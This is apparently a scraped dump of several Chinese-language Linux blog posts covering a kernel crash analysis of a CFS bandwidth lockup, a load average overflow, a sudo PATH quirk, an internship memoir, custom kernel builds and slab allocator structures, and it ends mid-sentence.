ffffffff81051037#20 [ffff88103fbc3f98] smp_apic_timer_interrupt at ffffffff81699f0f#21 [ffff88103fbc3fb0] apic_timer_interrupt at ffffffff8169845d--- &lt;IRQ stack&gt; ---#22 [ffff8801699a3de8] apic_timer_interrupt at ffffffff8169845d [exception RIP: native_safe_halt+6] RIP: ffffffff81060fe6 RSP: ffff8801699a3e98 RFLAGS: 00000286 RAX: 00000000ffffffed RBX: ffff88103fbcd080 RCX: 0100000000000000 RDX: 0000000000000000 RSI: 0000000000000000 RDI: 0000000000000046 RBP: ffff8801699a3e98 R8: 0000000000000000 R9: 0000000000000000 R10: 0000000000000000 R11: 0000000000000000 R12: 00099b9bb0645f00 R13: ffff88103fbcfde0 R14: f21bf8c4662d3c34 R15: 0000000000000082 ORIG_RAX: ffffffffffffff10 CS: 0010 SS: 0018#23 [ffff8801699a3ea0] default_idle at ffffffff810347ff#24 [ffff8801699a3ec0] arch_cpu_idle at ffffffff81035146#25 [ffff8801699a3ed0] cpu_startup_entry at ffffffff810e82f5#26 [ffff8801699a3f28] start_secondary at ffffffff8104f0da 看 bt 的长相，推断系统死亡之前应该没啥事情，然后开始处理一个时钟中断，正在处理时钟中断的过程中发生一个 NMI 异常，然后进入异常处理，然后在异常处理里 panic 了。在异常栈中选择多看了两眼的函数是 watchdog_overflow_callback，是因为后面的打印信息和 panic 操作都在这个函数里面进行的，关于 watchdog_overflow_callback 这个函数描述^watchdog： This function is invoked from Non-Maskable Interrupt (NMI) context. If a CPU is busy, this function executes periodically and it checks whether watchdog_timer_fn has incremented the CPU-specific counter during the past interval. If the counter has not been incremented, watchdog_overflow_callback assumes that the CPU is ‘locked up’ in a section of kernel code where interrupts are disabled, and a panic occurs unless ‘panic on hard lockup’ is explicitly disabled via the nmi_watchdog&#x3D;nopanic parameter on the kernel command line. 分析 watchdog_overflow_callback 函数的实现，其中 is_hardlockup 后面对应的代码块中具体是对比如下的两个值： 1234crash&gt; px hrtimer_interrupts_saved:7per_cpu(hrtimer_interrupts_saved, 7) = $14 = 0xa50fbcrash&gt; px hrtimer_interrupts:7per_cpu(hrtimer_interrupts, 7) = $15 = 0xa50fb 其中 hrtimer_interrupts 是 pre-cpu 变量，它会被 call_timer_fn 更新 (根据外部信息)，也就是说 watchdog 发现 cpu #7 locked up 在一块内核代码里了。回头注意看一下 bt 注意其中两次 RFLAGS 的变化，在中断栈之前 00000286 是即 IF 标志位置位，进入异常栈过后发现 00000002 即 IF 未置位，一个典型中断被 NMI 抢占的现象，这现象可能是 ISR 占用了太久了触发了 watchdog。 IRQ stack 如下： 1234567891011121314151617181920 [exception RIP: update_curr+15] RIP: ffffffff810ce3cf RSP: ffff88103fbc3db8 RFLAGS: 00000002 RAX: 0000000000000001 RBX: ffff88092b2ed200 RCX: 0000000000000001 RDX: 0000000000000001 RSI: ffff88092b2ed200 RDI: ffff880f6afb8600 RBP: ffff88103fbc3dd0 R8: ffff88103d2b7500 R9: 0000000000000001 R10: 0000000000000000 R11: 0000000000000000 R12: ffff880f6afb8600 R13: 0000000000000001 R14: 0000000000000003 R15: ffff8813bf7f5548 ORIG_RAX: ffffffffffffffff CS: 0010 SS: 0018--- &lt;NMI exception stack&gt; ---#12 [ffff88103fbc3db8] update_curr at ffffffff810ce3cf#13 [ffff88103fbc3dd8] enqueue_entity at ffffffff810d042d#14 [ffff88103fbc3e20] unthrottle_cfs_rq at ffffffff810d16f4#15 [ffff88103fbc3e58] distribute_cfs_runtime at ffffffff810d1932#16 [ffff88103fbc3ea0] sched_cfs_period_timer at ffffffff810d1acf#17 [ffff88103fbc3ed8] __hrtimer_run_queues at ffffffff810b4d72#18 [ffff88103fbc3f30] hrtimer_interrupt at ffffffff810b5310#19 [ffff88103fbc3f80] local_apic_timer_interrupt at ffffffff81051037#20 [ffff88103fbc3f98] smp_apic_timer_interrupt at ffffffff81699f0f#21 [ffff88103fbc3fb0] apic_timer_interrupt at ffffffff8169845d--- &lt;IRQ stack&gt; --- 已知 apic_timer_interrupt 会禁用中断，而且在 hrtimer_interrupt 函数注释也重复说明了这一点，就在一定程度上强化了之前猜想 ISR（apic_timer_interrupt）触发 NMI watchdog 的想法。 1234567891011crash&gt; dis -s hrtimer_interrupt|head -n 10FILE: kernel/hrtimer.cLINE: 1292 1287\t/* 1288 * High resolution timer interrupt 1289 * Called with interrupts disabled 1290 */ 1291\tvoid hrtimer_interrupt(struct clock_event_device *dev)* 1292\t&#123; 1293 struct hrtimer_cpu_base *cpu_base = this_cpu_ptr(&amp;hrtimer_bases); 通过 backtrace 梳理函数的调用关系 update_curr&lt;-enqueue_entity&lt;-unthrottle_cfs_rq&lt;-distribute_cfs_runtime&lt;-sched_cfs_period_timer猜测这个可能与 CFS Bandwidth Control [^cfs_bandwidth] 特性有点关系 (通过 dis -s unthrottle_cfs_rq 确认)，下面就是利基于 x86_64 上 caller 与 callee 约定以及函数原型看参数，去参数的值对比。 第一组：distribute_cfs_runtime 函数原型： 123crash&gt; dis -s distribute_cfs_runtime 3423 static u64 distribute_cfs_runtime(struct cfs_bandwidth *cfs_b, 3424 u64 remaining, u64 expires) caller: 1#16 [ffff88103fbc3ea0] sched_cfs_period_timer at ffffffff810d1acf 123456crash&gt; dis 0xffffffff810d1acf -r |tail...0xffffffff810d1ac1 &lt;sched_cfs_period_timer+193&gt;:\tmov %r13,%rsi0xffffffff810d1ac4 &lt;sched_cfs_period_timer+196&gt;:\tmov %r15,%rdx0xffffffff810d1ac7 &lt;sched_cfs_period_timer+199&gt;:\tmov %r12,%rdi0xffffffff810d1aca &lt;sched_cfs_period_timer+202&gt;:\tcallq 0xffffffff810d1840 &lt;distribute_cfs_runtime&gt; callee: 123456789101112crash&gt; dis distribute_cfs_runtime|head -n 200xffffffff810d1840 &lt;distribute_cfs_runtime&gt;:\tnopl 0x0(%rax,%rax,1) [FTRACE NOP]0xffffffff810d1845 &lt;distribute_cfs_runtime+5&gt;:\tpush %rbp0xffffffff810d1846 &lt;distribute_cfs_runtime+6&gt;:\tmov %rsp,%rbp0xffffffff810d1849 &lt;distribute_cfs_runtime+9&gt;:\tpush %r15 // 3rd0xffffffff810d184b &lt;distribute_cfs_runtime+11&gt;:\tpush %r140xffffffff810d184d &lt;distribute_cfs_runtime+13&gt;:\tmov %rdx,%r140xffffffff810d1850 &lt;distribute_cfs_runtime+16&gt;:\tpush %r13 // 2nd0xffffffff810d1852 &lt;distribute_cfs_runtime+18&gt;:\tpush %r12 // 1st0xffffffff810d1854 &lt;distribute_cfs_runtime+20&gt;:\tmov %rsi,%r120xffffffff810d1857 &lt;distribute_cfs_runtime+23&gt;:\tpush %rbx0xffffffff810d1858 &lt;distribute_cfs_runtime+24&gt;:\tsub $0x10,%rsp 12345678crash&gt; bt -f...#15 [ffff88103fbc3e58] distribute_cfs_runtime at ffffffff810d1932 ffff88103fbc3e60: ffff88103d2b7500 f21bf8c4662d3c34 ffff88103fbc3e70: ffff8813bf7f5580 ffff8813bf7f5548 ffff88103fbc3e80: 0000000002625a00 ffff8813bf7f5640 ffff88103fbc3e90: 00099ba6210dc705 ffff88103fbc3ed0 ffff88103fbc3ea0: ffffffff810d1acf 根据栈顺序：cfs_bandwidth *cfs_b 是 ffff8813bf7f5548,u64 remaining 是 0000000002625a00,u64 expires 是 00099ba6210dc705。 第二组数 unthrottle_cfs_rq 函数 原型：unthrottle_cfs_rq(struct cfs_rq *cfs_rq) caller: 1234crash&gt; dis -r ffffffff810d1932 | tail...0xffffffff810d192a &lt;distribute_cfs_runtime+234&gt;:\tmov %r15,%rdi0xffffffff810d192d &lt;distribute_cfs_runtime+237&gt;:\tcallq 0xffffffff810d1610 &lt;unthrottle_cfs_rq&gt; callee: 12345crash&gt; dis -r ffffffff810d16f4 | head -n 200xffffffff810d1610 &lt;unthrottle_cfs_rq&gt;:\tnopl 0x0(%rax,%rax,1) [FTRACE NOP]0xffffffff810d1615 &lt;unthrottle_cfs_rq+5&gt;:\tpush %rbp0xffffffff810d1616 &lt;unthrottle_cfs_rq+6&gt;:\tmov %rsp,%rbp0xffffffff810d1619 &lt;unthrottle_cfs_rq+9&gt;:\tpush %r15 12345#14 [ffff88103fbc3e20] unthrottle_cfs_rq at ffffffff810d16f4 ffff88103fbc3e28: ffff88103fe56c40 00000000008cc0b3 ffff88103fbc3e38: ffff8813bf7f5640 00099ba6210dc705 ffff88103fbc3e48: ffff88103d2b7400 ffff88103fbc3e98 ffff88103fbc3e58: ffffffff810d1932 则 struct cfs_rq *cfs_rq 是 ffff88103d2b7400 查看结构体字段的值： 123crash&gt; cfs_rq.runtime_remaining,runtime_expires ffff88103d2b7400 runtime_remaining = 1 runtime_expires = 2704412611823365 获取 cfs_rq.throttled_list 链表的地址： 1234crash&gt; cfs_rq.throttled_list ffff88103d2b7400 -oxstruct cfs_rq &#123; [ffff88103d2b7500] struct list_head throttled_list;&#125; 确认 rq 的剩余运行时间总量： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970crash&gt; list -H ffff88103d2b7500 -o cfs_rq.throttled_list -s cfs_rq.runtime_remaining | grep -c runtime_remaining22crash&gt; list -H ffff88103d2b7500 -o cfs_rq.throttled_list -s cfs_rq.throttled,runtime_remainingffff88103d2b6200 throttled = 1 runtime_remaining = -2535ffff88103d2b6800 throttled = 1 runtime_remaining = -2337ffff88103d2b7e00 throttled = 1 runtime_remaining = -2706ffff880f30f33e00 throttled = 1 runtime_remaining = -2441ffff88103d2b5600 throttled = 1 runtime_remaining = -2356ffff88103d2b6a00 throttled = 1 runtime_remaining = -2365ffff88103d2b7a00 throttled = 1 runtime_remaining = -2260ffff88103d2b5400 throttled = 1 runtime_remaining = -2404ffff88103d2b6c00 throttled = 1 runtime_remaining = -2421ffff88103d2b7600 throttled = 1 runtime_remaining = -2429ffff88103d2b4200 throttled = 1 runtime_remaining = -2357ffff88103d2b7800 throttled = 1 runtime_remaining = -2359ffff88103d2b6000 throttled = 1 runtime_remaining = -2416ffff88103d2b7200 throttled = 1 runtime_remaining = -2353ffff88103d2b6e00 throttled = 1 runtime_remaining = -2263ffff8813be33a800 throttled = 1 runtime_remaining = -3394ffff880f30f33c00 throttled = 1 runtime_remaining = -2599ffff880f30f31000 throttled = 1 runtime_remaining = -2546ffff8813be33ae00 throttled = 1 runtime_remaining = -3157ffff88103d2b4c00 throttled = 1 runtime_remaining = -2337ffff88103d2b6600 throttled = 1 runtime_remaining = -2284ffff8813bf7f5540 throttled = 1767994478 runtime_remaining = 0 看到一组异常的值明显和上面的 cfs_rq 的不一样。 123crash&gt; struct cfs_rq.throttled,runtime_remaining ffff8813bf7f5540 throttled = 1767994478 runtime_remaining = 0 感谢 wuzhouhui 的指正 ffff8813bf7f5540 是一个 cfs_bandwidth 结构体，所以值看上去非常诡异。 累加 remaining 的值计算一共多少时间。 12crash&gt; pd 2535+2337+2706+2441+2356+2365+2260+2404+2421+2429+2357+2359+2416+2353+2263+3394+2599+2546+3157+2337+2284+0$2 = 52319 如法炮制，来取得 static u64 distribute_cfs_runtime(struct cfs_bandwidth *cfs_b, u64 remaining, u64 expires) 中 remaining 参数经过处理过后的值： 1234567891011121314151617/usr/src/debug/kernel-3.10.0-514.26.2.el7/linux-3.10.0-514.26.2.el7.x86_64/kernel/sched/fair.c: 34380xffffffff810d190e &lt;distribute_cfs_runtime+206&gt;: sub %rcx,%rdx0xffffffff810d1911 &lt;distribute_cfs_runtime+209&gt;: cmp %rdx,%r120xffffffff810d1914 &lt;distribute_cfs_runtime+212&gt;: cmovbe %r12,%rdx/usr/src/debug/kernel-3.10.0-514.26.2.el7/linux-3.10.0-514.26.2.el7.x86_64/kernel/sched/fair.c: 34410xffffffff810d1918 &lt;distribute_cfs_runtime+216&gt;: sub %rdx,%r12/usr/src/debug/kernel-3.10.0-514.26.2.el7/linux-3.10.0-514.26.2.el7.x86_64/kernel/sched/fair.c: 34430xffffffff810d191b &lt;distribute_cfs_runtime+219&gt;: add %rcx,%rdx/usr/src/debug/kernel-3.10.0-514.26.2.el7/linux-3.10.0-514.26.2.el7.x86_64/kernel/sched/fair.c: 34470xffffffff810d191e &lt;distribute_cfs_runtime+222&gt;: test %rdx,%rdx/usr/src/debug/kernel-3.10.0-514.26.2.el7/linux-3.10.0-514.26.2.el7.x86_64/kernel/sched/fair.c: 34430xffffffff810d1921 &lt;distribute_cfs_runtime+225&gt;: mov %rdx,0xd8(%r15)/usr/src/debug/kernel-3.10.0-514.26.2.el7/linux-3.10.0-514.26.2.el7.x86_64/kernel/sched/fair.c: 34470xffffffff810d1928 &lt;distribute_cfs_runtime+232&gt;: jle 0xffffffff810d18bf &lt;distribute_cfs_runtime+127&gt;/usr/src/debug/kernel-3.10.0-514.26.2.el7/linux-3.10.0-514.26.2.el7.x86_64/kernel/sched/fair.c: 34480xffffffff810d192a &lt;distribute_cfs_runtime+234&gt;: mov %r15,%rdi0xffffffff810d192d &lt;distribute_cfs_runtime+237&gt;: callq 0xffffffff810d1610 &lt;unthrottle_cfs_rq&gt; 123456789101112crash&gt; l 343834333434 raw_spin_lock(&amp;rq-&gt;lock);3435 if (!cfs_rq_throttled(cfs_rq))3436 goto next;34373438 runtime = -cfs_rq-&gt;runtime_remaining + 1;3439 if (runtime &gt; remaining)3440 runtime = remaining;3441 remaining -= runtime;34423443 cfs_rq-&gt;runtime_remaining += runtime; 可以看到 remaining 的值放在 r12 里面，且下面的汇编指令都没有修改 r12，就调用了 unthrottle_cfs_rq。 12345678crash&gt; dis unthrottle_cfs_rq0xffffffff810d1610 &lt;unthrottle_cfs_rq&gt;: nopl 0x0(%rax,%rax,1) [FTRACE NOP]0xffffffff810d1615 &lt;unthrottle_cfs_rq+5&gt;: push %rbp0xffffffff810d1616 &lt;unthrottle_cfs_rq+6&gt;: mov %rsp,%rbp0xffffffff810d1619 &lt;unthrottle_cfs_rq+9&gt;: push %r150xffffffff810d161b &lt;unthrottle_cfs_rq+11&gt;: push %r140xffffffff810d161d &lt;unthrottle_cfs_rq+13&gt;: push %r130xffffffff810d161f &lt;unthrottle_cfs_rq+15&gt;: push %r12 12345678#14 [ffff88103fbc3e20] unthrottle_cfs_rq at ffffffff810d16f4 ffff88103fbc3e28: ffff88103fe56c40 00000000008cc0b3 // r12 ffff88103fbc3e38: ffff8813bf7f5640 00099ba6210dc705 ffff88103fbc3e48: ffff88103d2b7400 ffff88103fbc3e98 // r15 | rbp ffff88103fbc3e58: ffffffff810d1932crash&gt; pd 0x00000000008cc0b3$3 = 9224371 在 unthrottle_cfs_rq 中取得 distribute_cfs_runtime 的 remaining 的值为 9224371。 12345678crash&gt; cfs_bandwidth.throttled_cfs_rq ffff8813bf7f5548 throttled_cfs_rq = &#123; next = 0xffff88103d2b6300, prev = 0xffff88103d2b6700 &#125;crash&gt; list 0xffff88103d2b6300 | wc -l22 之前计算在地址为 ffff88103d2b7400 的 cfs_rq 中的 runtime_remaining 的值为 52319。distribute_cfs_runtime 中的本地变量的 remaining 为 9224371 远大于 cfs_rq 中的 remaining 为 52319，这就是使得 kernel 在下面 while 的循环中出不来： 1234567891011121314151617181920212223242526272829303132333435crash&gt; l do_sched_cfs_period_timer3471...35133514 /*3515 * This check is repeated as we are holding onto the new bandwidth3516 * while we unthrottle. This can potentially race with an unthrottled3517 * group trying to acquire new bandwidth from the global pool.3518 */3519 while (throttled &amp;&amp; runtime &gt; 0) &#123;3520 raw_spin_unlock(&amp;cfs_b-&gt;lock);3521 /* we can&#x27;t nest cfs_b-&gt;lock while distributing bandwidth */3522 runtime = distribute_cfs_runtime(cfs_b, runtime,3523 runtime_expires);3524 raw_spin_lock(&amp;cfs_b-&gt;lock);35253526 throttled = !list_empty(&amp;cfs_b-&gt;throttled_cfs_rq);3527 &#125;35283529 /* return (any) remaining runtime */3530 cfs_b-&gt;runtime = runtime;3531 /*3532 * While we are ensured activity in the period following an3533 * unthrottle, this also covers the case in which the new bandwidth is3534 * insufficient to cover the existing bandwidth deficit. (Forcing the3535 * timer to remain active while there are any throttled entities.)3536 */3537 cfs_b-&gt;idle = 0;35383539 return 0;35403541 out_deactivate:3542 cfs_b-&gt;timer_active = 0;3543 return 1;3544 &#125; referece： [^cfs_bandwidth]: CFS Bandwidth Control","tags":["linux"]},{"title":"a question which about load_avg","path":"/2017/08/25/about-load_avg-and-nr_running/","content":"写这个这个 post 的原因我们之前的线上主机 (3.10.0-229.el7) 的 load 非常非常诡异高达4294967293.49, 4294967293.43, 4294967259.67,众所周知 Linux 下影响 load 的两个重要指标是running queue 的大小，和 不可中断睡眠。 然后看了一下 ps 没有 D 状态的进程，那么也就是说系统 rq 非常非常大，vmstat一看果然如此，然后进入系统的调度器的 debug 信息一看，发现一个 cpu 上的 nr_running 过于夸张。 123456789101112$ cat /proc/sched_debug | grep cpu#2 -A 10cpu#2, 2599.996 MHz .nr_running : 4294967293 .load : 0 .nr_switches : 31613974 .nr_load_updates : 125150154 .nr_uninterruptible : -480 .next_balance : 4462.218862 .curr-&gt;pid : 0 .clock : 167551354.006710 .cpu_load[0] : 0 .cpu_load[1] : 0 判断数值非常可能是某个路径导致了溢出。 123$ipythonIn [2]: hex(4294967293)Out[2]: &#x27;0xfffffffd&#x27; 问题在重启后暂时消失了，目前没复现，也就是说没有找到 root cause，在一番尝试下不仅没有解决问题还产生了新的疑惑如下： 123456789101112#!/usr/bin/env stapglobal traced_cpu;probe begin &#123; traced_cpu = $1 printf(&quot;Tracing CPU%d... &quot;, traced_cpu);&#125;probe kernel.function(&quot;inc_nr_running&quot;) &#123; if(cpu() != traced_cpu) next; printf(&quot;current is inc_nr and nr is %d &quot;, @var(&quot;rq&quot;)-&gt;nr_running);&#125; 负责产生 load 触发 enqueue 操作的代码。 12345678int main()&#123;int var = 0;while(1)&#123;var = 1+1 ;&#125;return 0;&#125; 我开了 tmux，在另一个窗口运行如下代码，然后切好换回产生 enqueue 的代码，反复运行。 1# stap -v 1.stp 6 在另一个 terminal 里面观察 nr_running 有时候会变成 0。 123456789101112131415current is inc_nr and nr is 9current is inc_nr and nr is 9current is inc_nr and nr is 9current is inc_nr and nr is 9current is inc_nr and nr is 10current is inc_nr and nr is 0current is inc_nr and nr is 10current is inc_nr and nr is 0current is inc_nr and nr is 9current is inc_nr and nr is 9current is inc_nr and nr is 9current is inc_nr and nr is 9current is inc_nr and nr is 9current is inc_nr and nr is 9current is inc_nr and nr is 9 等哪天有时间再追杀，或者哪个大佬知道原因帮忙讲一下，拜谢！","tags":["linux"]},{"title":"bash common sense issues","path":"/2017/07/12/bash-trap/","content":"今天遇到一个经验上的一个陷阱，蛮有意思的。小伙伴问我为什么 sudo 前后的 pip 位置不一样？ 12345678[guohao@localhost ~]$ sudo type pippip is /bin/pip[guohao@localhost ~]$ type pippip is /usr/bin/pip[guohao@localhost ~]$ echo $PATH/usr/local/bin:/usr/bin:/usr/local/sbin:/usr/sbin:/home/guohao/.local/bin:/home/guohao/bin[guohao@localhost ~]$ sudo echo $PATH/usr/local/bin:/usr/bin:/usr/local/sbin:/usr/sbin:/home/guohao/.local/bin:/home/guohao/bin 经验之谈就是 sudo 使用了 root 的 PATH 环境变量，然后 echo 一下 path 变量完全一致。 case 1: 123456[guohao@localhost ~]$ sudo bash[root@localhost guohao]# type pippip is /bin/pip[root@localhost guohao]# exit[guohao@localhost ~]$ type pippip is /usr/bin/pip 发现 case 1 与之前的显示结果一致，type 符合预期行为，从第一个 PATH 中打印 pip 的位置。这就很奇怪了，为什么切换到 shell 里面去和在外面的值不一致呢？ case2: 1234[guohao@localhost ~]$ echo &#x27;echo $PATH&#x27; | sh/usr/local/bin:/usr/bin:/usr/local/sbin:/usr/sbin:/home/guohao/.local/bin:/home/guohao/bin[guohao@localhost ~]$ echo &#x27;echo $PATH&#x27; | sudo sh/sbin:/bin:/usr/sbin:/usr/bin 诡异了只有 echo 不一样！难道是 sudo 的特别复杂的特性，然后 strace 一下发现是 bash 的导致我犯了一个思维定势的错误。 12[guohao@localhost ~]$ strace sudo echo &quot;$PATH&quot;execve(&quot;/usr/bin/sudo&quot;, [&quot;sudo&quot;, &quot;echo&quot;, &quot;/usr/local/bin:/usr/bin:/usr/loc&quot;...], 0x7ffcccc6e8f0 /* 17 vars */) = 0 顺便赞扬一下strace的便利与强大。","tags":["tips"]},{"title":"remote internship in flintos","path":"/2017/06/20/remote-intership-on-flintos/","content":"以为自上次离开北京就不会在来北京的工作的，但是事实上北京的工作机会比其他城市多太多。 0x00 再访京城准备入职这次来北京不同于上一次的心境，可能是经历多了一点。 熟悉项目本身花了一周工作日，这时候不得不感叹优秀的项目管理可以帮新人入手节约大量时间，不过因为客观条件限制很多时间在等待编译，这个期间主要看文档和钢之炼金术师，还有和老板聊天。 working-with-flintos 当时北京办公室常驻 3 人，一个全栈，老板和合伙人，在工作期间 carrie(一个美丽的小姐姐) 总是问我吃不吃零食，我总是说吃，嘿嘿，办公室的零食因为我到来与日俱减。被小姐姐打趣到完全不同于另一个腼腆的实习生，问什么都不吃。因为我之前没有尝过这些零食，这一波吃到好多好吃的。 办公室拍摄 熟悉项目的时间过的很快，北京还是很冷。周四那天晚上可能就是 2017 年最冷的一天了，老板约上和我一起实习在北京远程办公的小伙伴吃了个饭，聊了聊天，这样公司 base 北京的人都见过一面了。 后来去见了两个师兄，逛了南锣鼓巷，吃了个铜炉，吹了会牛 b，谈了谈人生，聊了聊职业规划。 福 1.20 号晚上去找之前一起在上海实习的朋友，并和另一个菊苣一起吃了个晚饭，第二天和朋友去参加冬日祭。 漫展 1.21 号早上就到南京转车准备回家过年了。 0x01 在学校工作正式办公开始于元宵节后，第一月刚刚接到任务还是蛮有压力的，主要是解决 intel 显卡在 pc 颁布 release 过程中的一些诡异情况，这个 case 主要靠抱大腿和多尝试解决的；后面几个月因为掌握了工作方法并不感觉压力大。 谈一下我的 mentor，一个非常 nice 的印度人，主要通过英语文本在 slack 上沟通工作问题，偶尔还会被安利一波印度电影，不过因为时差和语言差异直接沟通有时沟通并不是特别顺利。还记得 kernel 配置的问题，还被怼了一下，😁，现在想一想感觉自己还是 too naive， 在谈一下在远程办公的感受，在学校办公的体验真的超级棒，工作环境好，图书馆一楼的雅座有茶水供应有钢琴听，累了或者任务完成后可以骑车转学校，既可以享受学校的熟悉和便利的环境，还能周末和同学玩，这是好怀恋啊。 0x02 离职合同写到 5.30 离职，其实到 6 月 15 才离职，因为毕业设计的耽误和新的 release 的发布，我延长路我的工作日期。在产品的 bbs 里面看到用户的反馈，对产品的想象，有种满足感。 在离职前没几天还是收到了挽留，不过因为一些原因终究是离开的，自此整个学生时代的实习生涯结束了。o~ 我逝去的青春 哈哈哈 在最后还是蛮感谢老板能让我体验一下多文化跨时区的远程实习，让我有了段轻松美好的回忆。","tags":["life"]},{"title":"how to custom kernel on fedora","path":"/2017/04/10/custom-kernel-on-fedora/","content":"因为工作需要需要折腾一下，所以在这里备忘一下如何在 fedora 26 上测试 upstream 的代码。 12sudo dnf install fedpkg fedora-packager rpmdevtools ncurses-devel pesign elfutils-libelf-devel git clone git://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git 进入 Linux 源码目录，捡出需要的版本对应的 tag，然后准备一个 kernel 的编译配置文件。 123cd linuxgit checkout v4.11.0-rc8cp /boot/config-4.11.9-300.fc26.x86_64 .config 编译-j 的选项是多个编译进程同时工作，取决于你的 core 数量。完成过后安装压缩 kernel image，然后安装 kernel module。 123make -j4make installmake modules_install 利用 dracut 生成一个 initramfs，加个--force意思是说即使存在一个可以覆盖掉。最后更新一下 grub2 的配置文件。 12dracut &quot;&quot; `make kernelrelease` --forcegrub2-mkconfig -o /boot/grub2/grub.cfg","tags":["tips"]},{"title":"linux MM performance test","path":"/2016/12/03/linux-MM-performance-test/","content":"之前学习内存管理的换页算法与 workload 类型之间关系，其中的性能测试使用了vm-scalability项目，项目的 maintainer 非常耐心解答我关于项目使用的问题。 看项目的名字非常容易理解这个项目是为了解决测试内存管理子系统的拓展性问题的，之前我只是关注了换页算法 LRU 实现： 1234567-rwxr-xr-x\tcase-lru-file-mmap-read\t366\tlogstatsplain-rwxr-xr-x\tcase-lru-file-mmap-read-rand\t375\tlogstatsplain-rwxr-xr-x\tcase-lru-file-readonce\t555\tlogstatsplain-rwxr-xr-x\tcase-lru-file-readtwice\t863\tlogstatsplain-rwxr-xr-x\tcase-lru-memcg\t694\tlogstatsplain-rwxr-xr-x\tcase-lru-shm\t539\tlogstatsplain-rwxr-xr-x\tcase-lru-shm-rand\t348\tlogstatsplain 用它测试了mm: vmscan: move dirty pages out of the way until they’re flushed这个 patch，case-lru-file-readonce在 64 G 内存机器下面提示大约 3%，而 32G 下面提升非常有限了。 搜索了一下 mm 邮件列表可以看到有 kernel 开发者拿这个做性能回归测试的一个另一个例子[^regression]。 [^regression]: mm: fix vm-scalability regression in cgroup-aware workingset code","tags":["linux"]},{"title":"the data struct of slab","path":"/2016/11/19/the-data-struct-of-slab/","content":"slab 分配器是 kernel 主要用来解决内存内碎片问题，还有其它的优势比如加速分配和引入老化机制，最初的设计应该是借鉴了 Solaris 2.4。linux 内部的 slab 最初的实现非常精巧且非常非常久远。 用户态观察 (准确的讲这个文件输出的内容是在 sulb.c 里面实现的，不算是传统意义上的 slab) 123456789cat /proc/slabinfoslabinfo - version: 2.1# name &lt;active_objs&gt; &lt;num_objs&gt; &lt;objsize&gt; &lt;objperslab&gt; &lt;pagesperslab&gt; : tunables &lt;limit&gt; &lt;batchcount&gt; &lt;sharedfactor&gt; : slabdata &lt;active_slabs&gt; &lt;num_slabs&gt; &lt;sharedavail&gt;nf_conntrack_expect 0 0 224 36 2 : tunables 0 0 0 : slabdata 0 0 0nf_conntrack 204 204 320 51 4 : tunables 0 0 0 : slabdata 4 4 0rpc_inode_cache 51 51 640 51 8 : tunables 0 0 0 : slabdata 1 1 0xfs_dqtrx 0 0 528 62 8 : tunables 0 0 0 : slabdata 0 0 0xfs_dquot 0 0 472 69 8 : tunables 0 0 0 : slabdata 0 0 0... 设计示意图如下： 每种 cache 里面包含不同类型的对象的集合，cache 用 slab 组织这些对象，slab 在物理页面上连续，每个 slab 包含多个对象，每个 slab 根据里面空闲对象的数量来分类归属于 full，empty，partial 中的一种。 在 Linux 3.10 中 cache 用 kmem_cache 结构体来实现： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152struct kmem_cache &#123;// 可被调整缓存的参数，由 cache_chain_mutex 锁保护\tunsigned int batchcount;\tunsigned int limit; // 指定了 per-CPU 列表中保存的对象上限。如果超出，内核会将 batchcount 个对象返回到 slab\tunsigned int shared;\tunsigned int size; // 指定缓存管理区对象的长度\tu32 reciprocal_buffer_size; // 在每次分配和释放时访问\tunsigned int flags; /* constant flags */\tunsigned int num; /* # of objs per slab */// cache 的伸缩\t/* order of pgs per slab (2^n) */\tunsigned int gfporder;\t/* force GFP flags, e.g. GFP_DMA */\tgfp_t allocflags;\tsize_t colour; /* cache 着色的范围 */\tunsigned int colour_off;\t/* colour 着色的 offset */\tstruct kmem_cache *slabp_cache;\tunsigned int slab_size;\t/* 构造函数 func */\tvoid (*ctor)(void *obj);// cache 的构造或移除 const char *name; // cache 的名字\tstruct list_head list;\tint refcount;\tint object_size;\tint align;// debug 和统计信息不关注// 每 cpu 每 内存节点的数据\t/* * We put array[] at the end of kmem_cache, because we want to size * this array to nr_cpu_ids slots instead of NR_CPUS * (see kmem_cache_init()) * We still use [NR_CPUS] and not [1] or [0] because cache_cache * is statically defined, so we reserve the max number of cpus. * * We also need to guarantee that the list is able to accomodate a * pointer for each node since &quot;nodelists&quot; uses the remainder of * available pointers. */\tstruct kmem_cache_node **node; // ULK3 里面的 kmem_list3 结构体\tstruct array_cache *array[NR_CPUS + MAX_NUMNODES]; // 数组指针，每一项对应 cpu 或 numa 节点&#125;; kmem_cache_node 就是 ULKe3 中 kmem_list3 演化过来的， 123456789101112131415161718192021222324/* * The slab lists for all objects. */struct kmem_cache_node &#123;\tspinlock_t list_lock;#ifdef CONFIG_SLAB// slab 的三种分类，partial，full，free 组织链表// partial 链表放在第一个性能更好一点\tstruct list_head slabs_partial;\tstruct list_head slabs_full;\tstruct list_head slabs_free;\tunsigned long free_objects; // 所有未使用的对象\tunsigned int free_limit; // 指定了所有 slab 上容许未使用对象的最大数目\tunsigned int colour_next;\t// 每节点的着色\tstruct array_cache *shared;\t// 指向所有 cpu 共享的本地 cache\tstruct array_cache **alien;\t// on other nodes\tunsigned long next_reap;\t// 用于页框回收\tint free_touched; // 用于 slab 分配器的页框回收#endif// 移除了部分不关注的信息...&#125;; 不同于 Solaris 2.4 实现，Linux 自引入 slab 就是要考虑多处理器情况，而 array_cache 结构体的目的正是优化多处理下一些性能问题，更好的利用 cpu 的高速缓存。在分配和释放对象时候，以 LIFO 序从 _alloc 分发缓存过热的对象。减少链表的操作。减少自旋锁的操作。 每一个 array_cache 结构体描述一个本地 cache 的中 free 对象。 12345678910111213141516struct array_cache &#123;\tunsigned int avail; // available 指向当前可用对象指针的数量\tunsigned int limit; // 缓存在收缩之后空闲对象数量上限\tunsigned int batchcount; // 在 per-CPU 列表为空的情况下，从 cache 的 slab 中获取对象的数目\tunsigned int touched; // 从 cache 移除时 touched 为 1，cache 收缩时则 0.\tspinlock_t lock;\tvoid *entry[]; /* 下面注释写的蛮清楚的 * Must have this definition in here for the proper * alignment of array_cache. Also simplifies accessing * the entries. * * Entries should not be directly dereferenced as * entries belonging to slabs marked pfmemalloc will * have the lower bits set SLAB_OBJ_PFMEMALLOC */&#125;; slab 结构体用来组织对象，它总是被串在三中之前所述的链表中的一个中 (partial, full, free)。slab 描述符可能会被存放在两个地方：存放在 slab 外部，位于 cache_size 指向的一个普通高速缓存中；存放在 slab 